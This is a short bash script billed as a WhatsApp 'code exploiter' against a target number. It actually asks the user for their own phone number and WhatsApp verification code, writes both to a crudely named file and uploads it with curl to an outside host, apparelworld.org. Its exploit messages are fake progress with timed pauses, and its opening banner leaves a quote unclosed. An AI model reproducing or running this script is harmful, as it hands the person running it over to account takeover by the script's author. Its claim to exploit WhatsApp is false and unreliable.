#!/bin/bash
clear
echo "
<-- IndoSec -->
======================
¦¦   Whatsapp Code  ¦¦
¦¦     Exploiter    ¦¦
======================

×××××××××××××××××××××××××××;
echo "";
read -p "Your Number(+62xxxx)   => " nomer;
read -p "Target Number(+62xxxx) => " target;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 5;
echo "[+] Done.";
echo "Wait 5-10 minutes to get the code.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 5
echo "[+] Success Exploited!";
exit;
